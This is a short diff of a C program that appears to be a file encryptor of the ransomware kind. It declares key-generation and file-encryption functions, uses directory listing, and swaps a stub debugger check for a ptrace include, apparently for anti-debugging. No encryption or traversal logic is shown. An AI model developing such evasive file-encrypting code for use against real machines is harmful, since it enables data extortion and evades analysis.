@@ -1,31 +1,16 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
-
 #include <dirent.h>
 #include <time.h>
 #include <unistd.h>
-
+#include <sys/ptrace.h>
+#include <stdlib.h>
 #define KEY_LEN 32
 
 void encrypt_file(const char* path, const unsigned char* key_bytes);
 void generate_key(unsigned char* key_bytes);
-int IsDebuggerPresent(void)
-{
-    return 0;
-}
-
 int main(int argc, char* argv[]) {
-
-    srand(time(NULL));
-    if (IsDebuggerPresent()) {
-        printf("Debugger detected\n");
-        return EXIT_FAILURE;
-    }
-    else {
-        printf("Debugger not detected\n");
-    }
-    // Generate the key
     unsigned char key_bytes[KEY_LEN];
     generate_key(key_bytes);
 
